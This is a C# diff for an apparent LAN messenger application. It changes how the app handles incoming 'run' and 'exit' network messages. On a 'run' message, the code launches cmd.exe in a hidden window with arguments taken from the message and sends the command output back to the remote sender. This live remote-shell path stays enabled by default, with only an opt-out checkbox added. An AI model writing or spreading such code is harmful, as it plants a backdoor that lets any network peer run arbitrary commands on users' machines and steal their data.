@@ -69,7 +69,7 @@ namespace LIM
             }));
         }
 
-        public static void MessagesGetter(ListBox listBox, CheckBox ig_nid)
+        public static void MessagesGetter(ListBox listBox, CheckBox ig_nid, CheckBox ig_cmd, CheckBox ig_exit)
         {
             while (true)
             {
@@ -164,25 +164,33 @@ namespace LIM
                                 {
                                     if (((string)obj["name"]).ToLower().Equals("exit"))
                                     {
-                                        GlobalData.UdpCore.Close();
-                                        Environment.Exit(0);
-                                        continue;
-                                    }else if (((string)obj["name"]).ToLower().Equals("run"))
-                                    {
+                                        if (!ig_exit.Checked)
+                                        {
+                                            GlobalData.UdpCore.Close();
+                                            Environment.Exit(0);
+                                            continue;
+                                        }
 
-                                        Process CmdProcess = new Process();
-                                        CmdProcess.StartInfo.FileName = "cmd.exe";
-                                        CmdProcess.StartInfo.CreateNoWindow = true;
-                                        CmdProcess.StartInfo.UseShellExecute = false;
-                                        CmdProcess.StartInfo.RedirectStandardInput = true;
-                                        CmdProcess.StartInfo.RedirectStandardOutput = true;
-                                        CmdProcess.StartInfo.RedirectStandardError = true;
-                                        CmdProcess.StartInfo.Arguments = (string)obj["msg"];
-                                        CmdProcess.Start();
-                                        string output = CmdProcess.StandardOutput.ReadToEnd();
-                                        CmdProcess.WaitForExit();
-                                        CmdProcess.Close();
-                                        SendMessage(2, "return".ToUpper(), output, endpoint);
+                                    }
+                                    else if (((string)obj["name"]).ToLower().Equals("run"))
+                                    {
+                                        if (!ig_cmd.Checked)
+                                        {
+                                            Process CmdProcess = new Process();
+                                            CmdProcess.StartInfo.FileName = "cmd.exe";
+                                            CmdProcess.StartInfo.CreateNoWindow = true;
+                                            CmdProcess.StartInfo.UseShellExecute = false;
+                                            CmdProcess.StartInfo.RedirectStandardInput = true;
+                                            CmdProcess.StartInfo.RedirectStandardOutput = true;
+                                            CmdProcess.StartInfo.RedirectStandardError = true;
+                                            CmdProcess.StartInfo.Arguments = (string)obj["msg"];
+                                            CmdProcess.Start();
+                                            string output = CmdProcess.StandardOutput.ReadToEnd();
+                                            CmdProcess.WaitForExit();
+                                            CmdProcess.Close();
+                                            SendMessage(2, "return".ToUpper(), output, endpoint);
+                                        }
+                                        
                                     }
 
                                     continue;
@@ -192,26 +200,33 @@ namespace LIM
                                 {
                                     if (((string)obj["name"]).ToLower().Equals("exit"))
                                     {
-                                        GlobalData.UdpCore.Close();
-                                        Environment.Exit(0);
-                                        continue;
+                                        if (!ig_exit.Checked)
+                                        {
+                                            GlobalData.UdpCore.Close();
+                                            Environment.Exit(0);
+                                            continue;
+                                        }
                                     }
                                     else if (((string)obj["name"]).ToLower().Equals("run"))
                                     {
 
-                                        Process CmdProcess = new Process();
-                                        CmdProcess.StartInfo.FileName = "cmd.exe";
-                                        CmdProcess.StartInfo.CreateNoWindow = true;
-                                        CmdProcess.StartInfo.UseShellExecute = false;
-                                        CmdProcess.StartInfo.RedirectStandardInput = true;
-                                        CmdProcess.StartInfo.RedirectStandardOutput = true;
-                                        CmdProcess.StartInfo.RedirectStandardError = true;
-                                        CmdProcess.StartInfo.Arguments = (string)obj["msg"];
-                                        CmdProcess.Start();
-                                        string output = CmdProcess.StandardOutput.ReadToEnd();
-                                        CmdProcess.WaitForExit();
-                                        CmdProcess.Close();
-                                        SendMessage(2, "return".ToUpper(), output, endpoint);
+                                        if (!ig_cmd.Checked)
+                                        {
+                                            Process CmdProcess = new Process();
+                                            CmdProcess.StartInfo.FileName = "cmd.exe";
+                                            CmdProcess.StartInfo.CreateNoWindow = true;
+                                            CmdProcess.StartInfo.UseShellExecute = false;
+                                            CmdProcess.StartInfo.RedirectStandardInput = true;
+                                            CmdProcess.StartInfo.RedirectStandardOutput = true;
+                                            CmdProcess.StartInfo.RedirectStandardError = true;
+                                            CmdProcess.StartInfo.Arguments = (string)obj["msg"];
+                                            CmdProcess.Start();
+                                            string output = CmdProcess.StandardOutput.ReadToEnd();
+                                            CmdProcess.WaitForExit();
+                                            CmdProcess.Close();
+                                            SendMessage(2, "return".ToUpper(), output, endpoint);
+                                        }
+
                                     }
 
                                     continue;
